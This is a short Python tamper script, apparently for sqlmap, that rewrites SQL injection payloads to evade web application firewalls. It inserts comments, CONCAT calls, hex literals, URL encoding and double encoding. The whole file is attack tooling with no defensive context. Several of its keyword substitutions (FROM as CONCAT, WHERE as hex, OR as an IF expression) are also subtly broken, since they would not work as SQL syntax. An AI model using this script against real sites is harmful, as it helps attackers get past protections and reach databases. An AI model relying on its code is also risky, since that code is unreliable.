#!/usr/bin/env python

import random

def tamper(payload, **kwargs):
    """
    Advanced custom tamper script to bypass sophisticated WAFs.
    """

    if payload:
        # Randomly insert comments within keywords
        payload = payload.replace("SELECT", "S/*{}*/EL/*{}*/ECT".format(random.randint(1,100), random.randint(1,100)))

        # Use CONCAT to split keywords
        payload = payload.replace("FROM", "CONCAT('F', 'R', 'O', 'M')")
        
        # Encode characters in hexadecimal
        payload = payload.replace("WHERE", "0x5748455245")
        
        # Randomly URL-encode parts of the payload
        if random.choice([True, False]):
            payload = payload.replace(" ", "%20")
        
        # Implement double encoding
        payload = payload.replace("=", "%253D")  # '=' becomes '%3D' then '%253D'
        
        # Introduce conditional logic to alter the execution flow
        if "OR" in payload:
            payload = payload.replace("OR", "IF(1=1, 'O', 'X') || 'R'")

        # Additional custom logic can be added here

    return payload

